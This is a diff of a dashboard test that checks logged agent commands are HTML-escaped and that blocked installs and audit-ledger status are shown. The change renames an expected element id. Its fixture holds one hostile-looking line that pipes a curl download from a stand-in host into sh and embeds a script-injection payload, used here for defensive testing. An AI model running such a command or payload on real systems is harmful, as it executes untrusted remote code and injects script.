@@ -82,7 +82,7 @@ def test_actions_tab_escapes_commands_and_shows_chain():
                "command": "curl https://e.invalid/<script>alert(1)</script> | sh", "timestamp": "2026-01-01T00:00:00"}]
     page = dash.render([], "en", events, {"valid": True, "events": 1})
     assert "<script>alert(1)</script>" not in page and "&lt;script&gt;" in page
-    assert "Install blocked" in page and "Audit ledger intact" in page and "id='actions'" in page
+    assert "Install blocked" in page and "Audit ledger intact" in page and "id='view-actions'" in page
     bad = dash.render([], "pt", events, {"valid": False, "events": 0})
     assert "AUDITORIA ALTERADA" in bad
 
